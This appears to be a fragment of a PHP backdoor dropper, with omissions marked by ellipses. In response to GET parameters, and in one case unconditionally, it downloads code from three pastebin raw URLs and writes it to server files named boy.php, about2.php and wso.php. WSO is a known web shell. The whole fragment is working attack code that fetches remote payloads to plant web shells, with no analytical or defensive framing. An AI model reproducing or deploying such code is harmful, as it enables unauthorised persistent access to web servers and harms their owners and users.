...
if(isset($_GET["wibu"])){
$fck = file_get_contents("https://pastebin.com/raw/L0c96Gi4");
$asw = fopen("boy.php","w") or die ("gabisa bro");
fwrite($asw,$fck);
fclose($asw);
...
if(isset($_GET["shell"])){
$fck = file_get_contents("https://pastebin.com/raw/FbEHDbuz");
$asw = fopen("about2.php","w") or die ("gabisa bro");
fwrite($asw,$fck);
fclose($asw);
...
$fck = file_get_contents("https://pastebin.com/raw/ADRaLEDs");
$asw = fopen("wso.php","w") or die ("gabisa bro");
fwrite($asw,$fck);
fclose($asw);
